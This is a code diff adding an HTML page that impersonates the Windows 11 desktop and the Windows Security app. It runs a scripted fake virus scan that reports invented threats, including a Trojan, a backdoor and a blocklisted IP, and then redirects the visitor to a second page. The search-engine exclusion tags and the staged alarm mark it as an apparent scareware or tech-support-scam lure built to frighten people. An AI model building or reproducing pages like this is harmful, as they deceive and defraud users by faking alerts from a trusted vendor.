@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nositelinkssearchbox">
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Windows Security</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', 'Segoe UI Variable', system-ui, -apple-system, sans-serif;
+      background: #0a3d62;
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      user-select: none;
+    }
+
+    /* ── Windows 11 wallpaper ── */
+    .desktop {
+      flex: 1;
+      position: relative;
+      background:
+        radial-gradient(ellipse 80% 60% at 20% 80%, rgba(0,100,220,0.55) 0%, transparent 60%),
+        radial-gradient(ellipse 60% 50% at 80% 20%, rgba(100,180,255,0.3) 0%, transparent 55%),
+        radial-gradient(ellipse 100% 80% at 50% 50%, rgba(10,60,130,0.9) 0%, transparent 100%),
+        linear-gradient(135deg, #0d1f4a 0%, #0a3d8a 35%, #0052cc 65%, #1565c0 100%);
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* subtle light streaks on wallpaper */
+    .desktop::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 40% 30% at 70% 30%, rgba(255,255,255,0.07) 0%, transparent 60%),
+        radial-gradient(ellipse 30% 25% at 25% 65%, rgba(255,255,255,0.05) 0%, transparent 55%);
+      pointer-events: none;
+    }
+
+    /* ── Windows 11 Taskbar ── */
+    .taskbar {
+      height: 48px;
+      background: rgba(32, 32, 32, 0.92);
+      backdrop-filter: blur(30px) saturate(180%);
+      -webkit-backdrop-filter: blur(30px) saturate(180%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+      position: relative;
+      z-index: 50;
+      border-top: 1px solid rgba(255,255,255,0.08);
+      flex-shrink: 0;
+    }
+    .taskbar-center {
+      display: flex;
+      align-items: center;
+      gap: 2px;
+    }
+    .tb-btn {
+      width: 44px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 6px;
+      cursor: default;
+      position: relative;
+    }
+    .tb-btn:hover { background: rgba(255,255,255,0.1); }
+    .tb-btn svg { width: 20px; height: 20px; }
+    .tb-btn img { width: 20px; height: 20px; object-fit: contain; }
+    .tb-btn-active::after {
+      content: '';
+      position: absolute;
+      bottom: 3px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 14px;
+      height: 3px;
+      border-radius: 2px;
+      background: #60cdff;
+    }
+    .tb-separator { width: 1px; height: 28px; background: rgba(255,255,255,0.1); margin: 0 4px; }
+    /* start button */
+    .tb-start {
+      width: 44px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 6px;
+      cursor: default;
+    }
+    .tb-start:hover { background: rgba(255,255,255,0.1); }
+    /* search bar */
+    .tb-search {
+      height: 36px;
+      width: 260px;
+      background: rgba(255,255,255,0.08);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 0 12px;
+      cursor: default;
+      margin: 0 6px;
+    }
+    .tb-search-icon { opacity: 0.7; font-size: 13px; }
+    .tb-search-text { font-size: 12px; color: rgba(255,255,255,0.65); }
+    /* system tray */
+    .tb-tray {
+      position: absolute;
+      right: 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .tb-tray-icons {
+      display: flex;
+      align-items: center;
+      gap: 2px;
+    }
+    .tb-tray-icon {
+      width: 32px;
+      height: 36px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 4px;
+      font-size: 13px;
+      color: rgba(255,255,255,0.85);
+      cursor: default;
+    }
+    .tb-tray-icon:hover { background: rgba(255,255,255,0.1); }
+    .tb-clock {
+      height: 36px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 0 8px;
+      border-radius: 4px;
+      cursor: default;
+      min-width: 64px;
+    }
+    .tb-clock:hover { background: rgba(255,255,255,0.1); }
+    .tb-clock-time { font-size: 11px; color: rgba(255,255,255,0.9); line-height: 1.3; font-weight: 400; }
+    .tb-clock-date { font-size: 11px; color: rgba(255,255,255,0.9); line-height: 1.3; font-weight: 400; }
+
+    /* ── Windows Security App Window ── */
+    .win-app {
+      position: relative;
+      z-index: 10;
+      width: 900px;
+      max-width: 96vw;
+      height: 580px;
+      max-height: calc(100vh - 80px);
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 32px 80px rgba(0,0,0,0.55), 0 0 0 1px rgba(0,0,0,0.12);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    /* titlebar */
+    .win-app__titlebar {
+      height: 32px;
+      background: #f3f3f3;
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+      gap: 8px;
+      flex-shrink: 0;
+      border-bottom: 1px solid #e5e5e5;
+    }
+    .win-app__titlebar-icon { width: 16px; height: 16px; flex-shrink: 0; }
+    .win-app__titlebar-title { font-size: 12px; color: #1a1a1a; flex: 1; font-weight: 400; }
+    .win-app__titlebar-btns { display: flex; margin-left: auto; }
+    .win-app__titlebar-btn {
+      width: 46px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+      color: #5a5a5a;
+      cursor: default;
+      border: none;
+      background: none;
+      font-family: inherit;
+    }
+    .win-app__titlebar-btn:hover { background: #e5e5e5; }
+    .win-app__titlebar-btn.close:hover { background: #c42b1c; color: #fff; }
+
+    /* body = nav + content */
+    .win-app__body {
+      flex: 1;
+      display: flex;
+      overflow: hidden;
+    }
+
+    /* left nav */
+    .win-nav {
+      width: 250px;
+      background: #f3f3f3;
+      flex-shrink: 0;
+      display: flex;
+      flex-direction: column;
+      padding: 8px 0;
+      border-right: 1px solid #e5e5e5;
+      overflow-y: auto;
+    }
+    .win-nav__header {
+      padding: 12px 16px 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .win-nav__header-icon { font-size: 22px; }
+    .win-nav__header-title { font-size: 14px; font-weight: 600; color: #1a1a1a; line-height: 1.3; }
+    .win-nav__divider { height: 1px; background: #ddd; margin: 4px 12px 8px; }
+    .win-nav__item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 9px 16px;
+      font-size: 12.5px;
+      color: #3a3a3a;
+      cursor: default;
+      border-radius: 0;
+      position: relative;
+    }
+    .win-nav__item:hover { background: rgba(0,0,0,0.05); }
+    .win-nav__item.active {
+      background: rgba(0,120,212,0.1);
+      color: #0078d4;
+      font-weight: 600;
+    }
+    .win-nav__item.active::before {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 4px;
+      bottom: 4px;
+      width: 3px;
+      background: #0078d4;
+      border-radius: 0 2px 2px 0;
+    }
+    .win-nav__item-icon { font-size: 16px; width: 20px; text-align: center; flex-shrink: 0; }
+    .win-nav__item-warn {
+      margin-left: auto;
+      width: 16px;
+      height: 16px;
+      background: #c42b1c;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+      color: #fff;
+      font-weight: 700;
+    }
+
+    /* main content */
+    .win-content {
+      flex: 1;
+      overflow-y: auto;
+      padding: 24px 28px;
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+    .win-content__title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 4px;
+    }
+    .win-content__sub {
+      font-size: 12.5px;
+      color: #767676;
+      margin-bottom: 20px;
+    }
+
+    /* status banner */
+    .win-status-banner {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 14px 16px;
+      border-radius: 8px;
+      margin-bottom: 18px;
+    }
+    .win-status-banner.scanning {
+      background: #eff6fc;
+      border: 1px solid #c7e0f4;
+    }
+    .win-status-banner.threats {
+      background: #fdf2f2;
+      border: 1px solid #f4c2c2;
+      display: none;
+    }
+    .win-status-banner.threats.visible { display: flex; }
+    .win-status-banner__icon { font-size: 22px; flex-shrink: 0; margin-top: 1px; }
+    .win-status-banner__texts {}
+    .win-status-banner__title { font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 2px; }
+    .win-status-banner__desc { font-size: 12px; color: #5a5a5a; }
+
+    /* scan section */
+    .win-scan-section {
+      border: 1px solid #e5e5e5;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+    .win-scan-section__header {
+      background: #fafafa;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      border-bottom: 1px solid #e5e5e5;
+    }
+    .win-scan-section__header-icon { font-size: 16px; }
+    .win-scan-section__header-title { font-size: 13px; font-weight: 600; color: #1a1a1a; flex: 1; }
+    .win-scan-section__header-status {
+      font-size: 12px;
+      color: #0078d4;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .win-scan-section__body { padding: 16px; }
+
+    /* progress */
+    .win-progress-wrap { margin-bottom: 12px; }
+    .win-progress-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      margin-bottom: 5px;
+    }
+    .win-progress-label { font-size: 12px; color: #5a5a5a; }
+    .win-progress-pct { font-size: 12px; font-weight: 600; color: #0078d4; font-variant-numeric: tabular-nums; }
+    .win-progress-track {
+      height: 4px;
+      background: #e5e5e5;
+      border-radius: 999px;
+      overflow: hidden;
+    }
+    .win-progress-fill {
+      height: 100%;
+      width: 0%;
+      background: #0078d4;
+      border-radius: 999px;
+      transition: width 0.1s linear;
+    }
+    .win-progress-fill.flash { background: #c42b1c; }
+
+    /* scan meta row */
+    .win-scan-meta {
+      display: flex;
+      gap: 24px;
+      margin: 10px 0 12px;
+    }
+    .win-scan-meta-item { }
+    .win-scan-meta-label { font-size: 11px; color: #767676; margin-bottom: 2px; }
+    .win-scan-meta-value { font-size: 13px; font-weight: 600; color: #1a1a1a; font-variant-numeric: tabular-nums; }
+    .win-scan-meta-value.red { color: #c42b1c; }
+
+    /* current file */
+    .win-scan-file {
+      font-size: 11px;
+      color: #999;
+      font-family: Consolas, 'Cascadia Code', 'Courier New', monospace;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      margin-bottom: 14px;
+      min-height: 15px;
+    }
+
+    /* actions */
+    .win-scan-actions { display: flex; gap: 8px; align-items: center; }
+    .win-btn {
+      padding: 6px 16px;
+      border-radius: 4px;
+      font-size: 12.5px;
+      font-family: inherit;
+      cursor: pointer;
+      border: 1px solid transparent;
+    }
+    .win-btn-primary {
+      background: #0078d4;
+      color: #fff;
+      border-color: #0067b8;
+    }
+    .win-btn-primary:hover { background: #006cbd; }
+    .win-btn-secondary {
+      background: #f3f3f3;
+      color: #1a1a1a;
+      border-color: #d4d4d4;
+    }
+    .win-btn-secondary:hover { background: #e8e8e8; }
+
+    /* threat items */
+    .win-threats-list { margin-top: 12px; display: flex; flex-direction: column; gap: 8px; }
+    .win-threat-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      padding: 10px 12px;
+      background: #fdf2f2;
+      border: 1px solid #f4c2c2;
+      border-radius: 6px;
+      display: none;
+    }
+    .win-threat-item.show { display: flex; }
+    .win-threat-sev {
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background: #c42b1c;
+      color: #fff;
+      font-size: 12px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .win-threat-sev.high { background: #d97706; }
+    .win-threat-name { font-size: 12.5px; font-weight: 600; color: #1a1a1a; margin-bottom: 2px; }
+    .win-threat-desc { font-size: 11.5px; color: #767676; }
+
+    /* quick actions panel */
+    .win-quick-actions {
+      border: 1px solid #e5e5e5;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .win-quick-actions__header {
+      background: #fafafa;
+      padding: 10px 16px;
+      font-size: 13px;
+      font-weight: 600;
+      color: #1a1a1a;
+      border-bottom: 1px solid #e5e5e5;
+    }
+    .win-quick-actions__body { padding: 12px 16px; display: flex; gap: 10px; flex-wrap: wrap; }
+
+    /* spinning dot */
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.3} }
+    .scanning-dot {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #0078d4;
+      animation: blink 1s ease-in-out infinite;
+    }
+
+    /* fade-to-black overlay */
+    .redirect-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0);
+      z-index: 200;
+      pointer-events: none;
+      transition: background 0.6s ease;
+    }
+    .redirect-overlay.fading { background: rgba(0,0,0,1); pointer-events: all; }
+  </style>
+</head>
+<body>
+
+<!-- Desktop area -->
+<div class="desktop">
+
+  <!-- Windows Security App Window -->
+  <div class="win-app" id="winApp">
+
+    <!-- Titlebar -->
+    <div class="win-app__titlebar">
+      <img src="1d1m.png" class="win-app__titlebar-icon" alt="">
+      <span class="win-app__titlebar-title">Windows Security</span>
+      <div class="win-app__titlebar-btns">
+        <button class="win-app__titlebar-btn" type="button">&#x2500;</button>
+        <button class="win-app__titlebar-btn" type="button">&#x2610;</button>
+        <button class="win-app__titlebar-btn close" type="button">&#x2715;</button>
+      </div>
+    </div>
+
+    <!-- Body -->
+    <div class="win-app__body">
+
+      <!-- Left nav -->
+      <nav class="win-nav">
+        <div class="win-nav__header">
+          <span class="win-nav__header-icon">🛡</span>
+          <span class="win-nav__header-title">Windows<br>Security</span>
+        </div>
+        <div class="win-nav__divider"></div>
+        <div class="win-nav__item active">
+          <span class="win-nav__item-icon">🦠</span>
+          <span>Virus &amp; threat protection</span>
+          <span class="win-nav__item-warn">!</span>
+        </div>
+        <div class="win-nav__item">
+          <span class="win-nav__item-icon">👤</span>
+          <span>Account protection</span>
+        </div>
+        <div class="win-nav__item">
+          <span class="win-nav__item-icon">🔥</span>
+          <span>Firewall &amp; network protection</span>
+        </div>
+        <div class="win-nav__item">
+          <span class="win-nav__item-icon">🌐</span>
+          <span>App &amp; browser control</span>
+        </div>
+        <div class="win-nav__item">
+          <span class="win-nav__item-icon">🔒</span>
+          <span>Device security</span>
+        </div>
+        <div class="win-nav__item">
+          <span class="win-nav__item-icon">💊</span>
+          <span>Device performance &amp; health</span>
+        </div>
+        <div class="win-nav__item">
+          <span class="win-nav__item-icon">👨‍👩‍👧</span>
+          <span>Family options</span>
+        </div>
+        <div class="win-nav__divider" style="margin-top:auto;"></div>
+        <div class="win-nav__item">
+          <span class="win-nav__item-icon">⚙</span>
+          <span>Settings</span>
+        </div>
+      </nav>
+
+      <!-- Main content -->
+      <div class="win-content">
+        <div class="win-content__title">Virus &amp; threat protection</div>
+        <div class="win-content__sub">Protection for your device against threats.</div>
+
+        <!-- Status banner: scanning -->
+        <div class="win-status-banner scanning" id="bannerScanning">
+          <span class="win-status-banner__icon">🔍</span>
+          <div class="win-status-banner__texts">
+            <div class="win-status-banner__title">Full scan in progress…</div>
+            <div class="win-status-banner__desc">Windows Defender is scanning your device. This may take a few minutes.</div>
+          </div>
+        </div>
+
+        <!-- Status banner: threats found -->
+        <div class="win-status-banner threats" id="bannerThreats">
+          <span class="win-status-banner__icon">⚠️</span>
+          <div class="win-status-banner__texts">
+            <div class="win-status-banner__title" style="color:#c42b1c;">Threats found. Action required.</div>
+            <div class="win-status-banner__desc">Windows Defender found threats on your device. Review the results below.</div>
+          </div>
+        </div>
+
+        <!-- Scan progress section -->
+        <div class="win-scan-section">
+          <div class="win-scan-section__header">
+            <span class="win-scan-section__header-icon">🔍</span>
+            <span class="win-scan-section__header-title">Current threats</span>
+            <span class="win-scan-section__header-status">
+              <span class="scanning-dot" id="scanDot"></span>
+              <span id="scanStatusLabel">Scanning…</span>
+            </span>
+          </div>
+          <div class="win-scan-section__body">
+
+            <!-- Progress bar -->
+            <div class="win-progress-wrap">
+              <div class="win-progress-row">
+                <span class="win-progress-label" id="progressLabel">Full scan: scanning…</span>
+                <span class="win-progress-pct" id="pct">0%</span>
+              </div>
+              <div class="win-progress-track">
+                <div class="win-progress-fill" id="progFill"></div>
+              </div>
+            </div>
+
+            <!-- Meta stats -->
+            <div class="win-scan-meta">
+              <div class="win-scan-meta-item">
+                <div class="win-scan-meta-label">Items scanned</div>
+                <div class="win-scan-meta-value" id="statItems">0</div>
+              </div>
+              <div class="win-scan-meta-item">
+                <div class="win-scan-meta-label">Time elapsed</div>
+                <div class="win-scan-meta-value" id="statTime">0:00</div>
+              </div>
+              <div class="win-scan-meta-item">
+                <div class="win-scan-meta-label">Threats found</div>
+                <div class="win-scan-meta-value red" id="statThreats">0</div>
+              </div>
+              <div class="win-scan-meta-item">
+                <div class="win-scan-meta-label">Scan type</div>
+                <div class="win-scan-meta-value">Full scan</div>
+              </div>
+            </div>
+
+            <!-- Current file being scanned -->
+            <div class="win-scan-file" id="curFile">Initializing Windows Defender Antivirus engine…</div>
+
+            <!-- Threat items (revealed progressively) -->
+            <div class="win-threats-list">
+              <div class="win-threat-item" id="t1">
+                <div class="win-threat-sev">!</div>
+                <div>
+                  <div class="win-threat-name">Trojan:Script/Wacatac.B!ml</div>
+                  <div class="win-threat-desc">Severe · C:\Windows\Temp\svchost_update.exe · Quarantine recommended</div>
+                </div>
+              </div>
+              <div class="win-threat-item" id="t2">
+                <div class="win-threat-sev high">!</div>
+                <div>
+                  <div class="win-threat-name">Backdoor:Win32/Bladabindi!ml</div>
+                  <div class="win-threat-desc">High · AppData\Roaming\Microsoft\Windows\Start Menu\ · Remove recommended</div>
+                </div>
+              </div>
+              <div class="win-threat-item" id="t3">
+                <div class="win-threat-sev high">!</div>
+                <div>
+                  <div class="win-threat-name">IP Reputation: Flagged on global threat blocklist</div>
+                  <div class="win-threat-desc">High · Network · Your public IP is listed on Spamhaus SBL and abuse.ch blocklists</div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Action buttons -->
+            <div class="win-scan-actions" style="margin-top:14px;">
+              <button class="win-btn win-btn-secondary" type="button" id="cancelBtn">Cancel scan</button>
+              <span style="font-size:11px;color:#767676;" id="scanNote">Do not restart your computer during the scan.</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Quick actions -->
+        <div class="win-quick-actions">
+          <div class="win-quick-actions__header">Quick actions</div>
+          <div class="win-quick-actions__body">
+            <button class="win-btn win-btn-secondary" type="button" style="font-size:12px;">Scan history</button>
+            <button class="win-btn win-btn-secondary" type="button" style="font-size:12px;">Protection updates</button>
+            <button class="win-btn win-btn-secondary" type="button" style="font-size:12px;">Allowed threats</button>
+            <button class="win-btn win-btn-secondary" type="button" style="font-size:12px;">Scan options</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Taskbar -->
+<div class="taskbar">
+  <div class="taskbar-center">
+    <!-- Start button -->
+    <div class="tb-start" title="Start">
+      <svg viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:18px;height:18px;">
+        <rect x="1" y="1" width="6.5" height="6.5" rx="1" fill="#F25022"/>
+        <rect x="8.5" y="1" width="6.5" height="6.5" rx="1" fill="#7FBA00"/>
+        <rect x="1" y="8.5" width="6.5" height="6.5" rx="1" fill="#00A4EF"/>
+        <rect x="8.5" y="8.5" width="6.5" height="6.5" rx="1" fill="#FFB900"/>
+      </svg>
+    </div>
+
+    <!-- Search -->
+    <div class="tb-search">
+      <span class="tb-search-icon">🔍</span>
+      <span class="tb-search-text">Search</span>
+    </div>
+
+    <div class="tb-separator"></div>
+
+    <!-- Task view -->
+    <div class="tb-btn" title="Task view">
+      <svg viewBox="0 0 20 20" fill="rgba(255,255,255,0.8)">
+        <rect x="1" y="1" width="8" height="8" rx="1.5"/>
+        <rect x="11" y="1" width="8" height="8" rx="1.5"/>
+        <rect x="1" y="11" width="8" height="8" rx="1.5"/>
+        <rect x="11" y="11" width="8" height="8" rx="1.5"/>
+      </svg>
+    </div>
+
+    <!-- File explorer -->
+    <div class="tb-btn tb-btn-active" title="File Explorer">
+      <svg viewBox="0 0 20 20" fill="rgba(255,255,255,0.85)" style="width:20px;height:20px;">
+        <path d="M2 5a2 2 0 012-2h3.5l2 2H16a2 2 0 012 2v7a2 2 0 01-2 2H4a2 2 0 01-2-2V5z"/>
+      </svg>
+    </div>
+
+    <!-- Chrome -->
+    <div class="tb-btn" title="Google Chrome">
+      <svg viewBox="0 0 20 20" style="width:20px;height:20px;">
+        <circle cx="10" cy="10" r="9" fill="#4285F4"/>
+        <circle cx="10" cy="10" r="4" fill="white"/>
+        <circle cx="10" cy="10" r="3" fill="#4285F4"/>
+      </svg>
+    </div>
+
+    <!-- Windows Security (active) -->
+    <div class="tb-btn tb-btn-active" title="Windows Security">
+      <img src="1d1m.png" style="width:18px;height:18px;object-fit:contain;" alt="">
+    </div>
+
+  </div>
+
+  <!-- System tray -->
+  <div class="tb-tray">
+    <div class="tb-tray-icons">
+      <div class="tb-tray-icon" title="Show hidden icons">&#x2038;</div>
+      <div class="tb-tray-icon" title="Network">📶</div>
+      <div class="tb-tray-icon" title="Volume">🔊</div>
+      <div class="tb-tray-icon" title="Battery">🔋</div>
+    </div>
+    <div class="tb-clock">
+      <span class="tb-clock-time" id="tb-time">12:00 PM</span>
+      <span class="tb-clock-date" id="tb-date">6/21/2026</span>
+    </div>
+  </div>
+</div>
+
+<!-- Fade-to-black redirect overlay -->
+<div class="redirect-overlay" id="overlay"></div>
+
+<script>
+(function () {
+  window.location.replace('page2.html');
+  return;
+
+  /* ── clock ── */
+  function updateClock() {
+    var now = new Date();
+    var h = now.getHours(), m = now.getMinutes();
+    var ampm = h >= 12 ? 'PM' : 'AM';
+    h = h % 12 || 12;
+    var p = function(n){ return String(n).padStart(2,'0'); };
+    var t = document.getElementById('tb-time');
+    var d = document.getElementById('tb-date');
+    if(t) t.textContent = h + ':' + p(m) + ' ' + ampm;
+    if(d) d.textContent = (now.getMonth()+1) + '/' + now.getDate() + '/' + now.getFullYear();
+  }
+  updateClock();
+  setInterval(updateClock, 10000);
+
+  /* ── scan animation ── */
+  var SCAN_MS = 3000;
+
+  var FILES = [
+    'C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\',
+    'C:\\Windows\\System32\\drivers\\atapi.sys',
+    'C:\\Windows\\System32\\ntoskrnl.exe',
+    'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
+    'C:\\Users\\Public\\AppData\\Local\\Temp\\~DF9AC2.tmp',
+    'C:\\Windows\\SysWOW64\\cmd.exe',
+    'C:\\Program Files (x86)\\Common Files\\microsoft shared\\ClickToRun\\',
+    'C:\\Windows\\System32\\svchost.exe',
+    'C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\',
+    'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe',
+    'C:\\Program Files\\WindowsApps\\Microsoft.WindowsStore_22308\\',
+    'C:\\Windows\\System32\\drivers\\tcpip.sys',
+    'C:\\Users\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\',
+    'C:\\Windows\\System32\\cryptsvc.dll',
+    'C:\\Windows\\System32\\lsass.exe',
+    'C:\\Users\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\',
+    'C:\\Windows\\SysWOW64\\msiexec.exe',
+    'C:\\Windows\\Temp\\svchost_update.exe',
+    'C:\\Windows\\System32\\spoolsv.exe',
+    'C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\',
+  ];
+
+  var pctEl    = document.getElementById('pct');
+  var fillEl   = document.getElementById('progFill');
+  var fileEl   = document.getElementById('curFile');
+  var itemsEl  = document.getElementById('statItems');
+  var timeEl   = document.getElementById('statTime');
+  var threatEl = document.getElementById('statThreats');
+  var labelEl  = document.getElementById('progressLabel');
+  var statusEl = document.getElementById('scanStatusLabel');
+  var dotEl    = document.getElementById('scanDot');
+  var overlay  = document.getElementById('overlay');
+  var banner   = document.getElementById('bannerThreats');
+  var bannerS  = document.getElementById('bannerScanning');
+  var noteEl   = document.getElementById('scanNote');
+
+  var t1 = document.getElementById('t1');
+  var t2 = document.getElementById('t2');
+  var t3 = document.getElementById('t3');
+
+  var start     = Date.now();
+  var totalItems = 31847;
+  var done      = false;
+
+  function pad(n){ return String(n).padStart(2,'0'); }
+
+  function tick() {
+    var elapsed = Date.now() - start;
+    var raw     = elapsed / SCAN_MS;
+    var pct     = Math.min(100, Math.round(raw * 100));
+
+    fillEl.style.width = pct + '%';
+    pctEl.textContent  = pct + '%';
+
+    var fi = Math.min(FILES.length - 1, Math.floor(raw * FILES.length));
+    fileEl.textContent = FILES[fi];
+
+    itemsEl.textContent = Math.floor(raw * totalItems).toLocaleString();
+
+    var sec = Math.floor(elapsed / 1000);
+    timeEl.textContent  = Math.floor(sec / 60) + ':' + pad(sec % 60);
+
+    /* reveal threats sequentially */
+    if (pct >= 55 && t1)  { t1.classList.add('show'); threatEl.textContent = '1'; }
+    if (pct >= 72 && t2)  { t2.classList.add('show'); threatEl.textContent = '2'; }
+    if (pct >= 85 && t3)  {
+      t3.classList.add('show');
+      threatEl.textContent = '3';
+      bannerS.style.display = 'none';
+      banner.classList.add('visible');
+      fillEl.classList.add('flash');
+      pctEl.style.color   = '#c42b1c';
+      labelEl.textContent = 'Full scan: threats detected';
+      statusEl.textContent = 'Threats found';
+      dotEl.style.background = '#c42b1c';
+      noteEl.textContent = 'Threats found. Windows will take action…';
+    }
+
+    if (pct < 100) {
+      requestAnimationFrame(tick);
+    } else if (!done) {
+      done = true;
+      itemsEl.textContent  = totalItems.toLocaleString();
+      statusEl.textContent = 'Scan complete';
+      dotEl.style.animation = 'none';
+      dotEl.style.background = '#c42b1c';
+      fileEl.textContent = 'Scan complete — 3 threats found. Launching security alert…';
+
+      /* brief pause then fade and redirect */
+      setTimeout(function () {
+        overlay.classList.add('fading');
+        setTimeout(function () {
+          window.location.replace('page2.html');
+        }, 600);
+      }, 800);
+    }
+  }
+
+  requestAnimationFrame(tick);
+
+})();
+</script>
+</body>
+</html>
